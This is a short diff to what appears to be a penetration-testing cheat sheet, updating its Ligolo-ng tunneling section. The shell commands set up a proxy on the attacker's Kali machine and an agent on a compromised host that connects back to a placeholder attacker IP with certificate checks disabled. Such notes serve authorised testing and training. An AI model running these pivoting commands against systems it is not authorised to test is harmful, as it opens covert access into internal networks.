@@ -107,16 +107,18 @@ run
 ## Tunneling
 
 ### Ligolo
+
+https://github.com/nicocha30/ligolo-ng
 kali
 ```sh
 sudo ip tuntap add user [your_username] mode tun ligolo
 sudo ip link set ligolo up
-./lin-proxy -selfcert -laddr 0.0.0.0:<port>
+ligolo-proxy -selfcert -laddr 0.0.0.0:<port>
 sudo ip route add <ip-range> dev ligolo
 ```
 host - upload agent
 ```
-./lin-agent -connect <attacker IP here>:<port> -ignore-cert
+agent.exe -connect <attacker IP here>:<port> -ignore-cert
 ```
 kali
 ```
